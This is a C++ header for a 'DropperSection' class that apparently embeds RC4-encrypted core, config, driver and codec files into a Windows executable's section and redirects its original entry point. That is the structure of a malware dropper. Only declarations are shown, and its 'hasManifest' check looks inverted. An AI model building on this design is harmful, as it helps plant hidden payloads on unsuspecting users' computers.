#pragma once

// #include <cstring>
#include <list>
#include <string>
#include <Windows.h>

#include "DropperCode.h"
#include "GenericSection.h"

typedef struct _file_buffer {
	std::string name;
	CHAR *buffer;
	DWORD size;
} NamedFileBuffer;

class PEObject;

class DropperSection : public GenericSection
{
private:
	
	std::list<std::string> _strings;
	
	std::string _installDir;
	
	struct {
		NamedFileBuffer core;
		NamedFileBuffer config;
		NamedFileBuffer driver;
		NamedFileBuffer codec;
	} _files;
	
	std::string _manifest;
	std::size_t _manifestOffset;
	
	unsigned char* _originalOEPCode;
	size_t _originalOEPCodeSize;
	
	int _exitProcessIndex;
	int _exitIndex;
	int _destroyWindowIndex;
	
	bool _readFile(std::string path, NamedFileBuffer& buffer);
	char* _embedFile(char* rc4key, NamedFileBuffer& source, DataSectionBlob& name, DataSectionCryptoPack& file, char* ptr );
	int _embedFunction( PVOID funcStart, PVOID funcEnd , DataSectionBlob& func, char *ptr );
	
public:
	DropperSection(PEObject& pe, string name, DWORD FileAlignment);
	virtual ~DropperSection(void);
	
	void addExecutableName(std::string name) { _strings.push_front(name); }
	void addInstallDir(std::string path) { _strings.push_front(path); }
	
	void addString(std::string str) { _strings.push_back(str); }
	
	bool addCoreFile(std::string path, std::string name);
	bool addConfigFile(std::string path, std::string name);
	bool addCodecFile(std::string path, std::string name);
	bool addDriverFile(std::string path, std::string name);
	
	void setExitProcessIndex(int index) { _exitProcessIndex = index; }
	void setExitIndex(int index) { _exitIndex = index; }

	void setOriginalOEPCode(unsigned char const * const code, size_t size);
	
	void setManifest(std::string manifest) { _manifest = manifest; }
	bool hasManifest() { return _manifest.empty(); }
	std::string manifest() { return _manifest; }
	std::size_t manifestOffset() { return _manifestOffset; }
	
	/* returns offset of new entry point*/
	DWORD build(WINSTARTFUNC OriginalEntryPoint);
	
	char const * const data() { return _data; }
	std::size_t const size() { return _size; }
};
